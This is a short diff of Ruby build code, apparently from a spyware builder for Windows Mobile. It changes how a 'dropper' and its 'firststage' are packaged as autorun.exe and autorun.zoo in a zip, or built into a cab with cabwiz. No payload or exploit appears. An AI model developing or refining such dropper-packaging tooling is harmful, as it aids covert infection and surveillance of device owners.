@@ -66,9 +66,8 @@ class BuildWinMo < Build
 
     trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"
 
-    @outputs << 'output'
+    @outputs = ['output', 'firststage']
   end
-
 
   def pack(params)
     trace :debug, "Build: pack: #{params}"
@@ -76,14 +75,13 @@ class BuildWinMo < Build
     case params['type']
       when 'local'
         Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-          z.file.open('2577/autorun.exe', "w") { |f| f.write File.open(path('firststage'), 'rb') {|f| f.read} }
-          z.file.open('2577/autorun.zoo', "w") { |f| f.write File.open(path('output'), 'rb') {|f| f.read} }
+          z.file.open('autorun.exe', "w") { |f| f.write File.open(path('firststage'), 'rb') {|f| f.read} }
+          z.file.open('autorun.zoo', "w") { |f| f.write File.open(path('output'), 'rb') {|f| f.read} }
         end
         # this is the only file we need to output after this point
         @outputs = ['output.zip']
 
       when 'remote'
-        #TODO: move this in the melt phase
         File.rename(path('firststage'), path('autorun.exe'))
         File.rename(path('output'), path('autorun.zoo'))
 
@@ -98,7 +96,6 @@ class BuildWinMo < Build
         CrossPlatform.exec path('cabwiz'), path('rcs.inf').gsub("/", '\\') + ' /compress'
 
         File.exist? path('rcs.cab') || raise("output file not created by cabwiz")
-
         File.rename path('rcs.cab'), path(@appname + '.cab')
 
         Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
